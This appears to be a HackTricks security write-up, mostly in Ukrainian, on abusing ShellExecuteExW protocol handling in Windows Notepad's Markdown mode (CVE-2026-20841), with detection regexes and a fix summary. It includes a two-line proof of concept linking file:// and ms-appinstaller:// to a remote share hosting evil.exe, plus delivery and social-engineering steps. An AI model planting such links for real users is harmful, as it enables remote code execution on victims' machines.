# Зловживання Windows Protocol Handler / ShellExecute (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Windows applications that render Markdown or HTML may hand clicked targets to `ShellExecuteExW`. Because ShellExecute dispatches registered URI schemes and file associations, a renderer needs an explicit allowlist rather than assuming every link is HTTP(S). Поведінка Notepad нижче описує CVE-2026-20841 і не повинна узагальнюватися на кожен renderer.<sup>[[1]](#references)[[3]](#references)</sup>

## Поверхня ShellExecuteExW у режимі Markdown Windows Notepad
- Notepad обирає режим Markdown **лише для розширень `.md`** через фіксоване порівняння рядків у `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Підтримувані Markdown links:
- Standard: `[text](target)`
- Autolink: `<target>` (рендериться як `[target](target)`), тому обидва синтаксиси мають значення для payloads і detections.
- Кліки по links обробляються в `sub_140170F60()`, яка виконує слабку фільтрацію, а потім викликає `ShellExecuteExW`.
- `ShellExecuteExW` передає виконання **будь-якому налаштованому protocol handler**, а не лише HTTP(S).<sup>[[1]](#references)</sup>

### Міркування щодо Payload
- Будь-які послідовності `\\` у link **нормалізуються до `\`** перед `ShellExecuteExW`, що впливає на створення UNC/path і detection.
- Файли `.md` **не асоційовані з Notepad за замовчуванням**; victim все одно має відкрити файл у Notepad і натиснути link, але після render link стає клікабельним.
- Небезпечні приклади schemes:<sup>[[1]](#references)</sup>
- `file://` для запуску local/UNC payload.
- `ms-appinstaller://` для запуску App Installer flows. Інші locally registered schemes також можуть бути abusable.

### Мінімальний PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Процес експлуатації
1. Створіть **файл `.md`**, щоб Notepad відображав його як Markdown.
2. Вбудуйте посилання, використовуючи небезпечну URI-схему (`file:`, `ms-appinstaller:` або будь-який встановлений handler).
3. Доставте файл (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB або подібним способом) і переконайте користувача відкрити його в Notepad.
4. Після натискання **нормалізоване посилання** передається до `ShellExecuteExW`, після чого відповідний protocol handler виконує вказаний контент у контексті користувача.<sup>[[1]](#references)[[2]](#references)</sup>

## Ідеї для виявлення
- Відстежуйте передачу файлів `.md` через порти/протоколи, які зазвичай використовуються для доставки документів: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Аналізуйте посилання Markdown (стандартні та autolink) і шукайте **без урахування регістру** `file:` або `ms-appinstaller:`.
- Regex від vendor для виявлення доступу до віддалених ресурсів:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Виправлення постачальника, описане ZDI, обмежує прийнятні цілі локальними файлами та HTTP(S). За потреби розширюйте виявлення на інші встановлені обробники протоколів, оскільки зареєстрована поверхня атаки залежить від системи.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: довільне виконання коду у Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC для CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
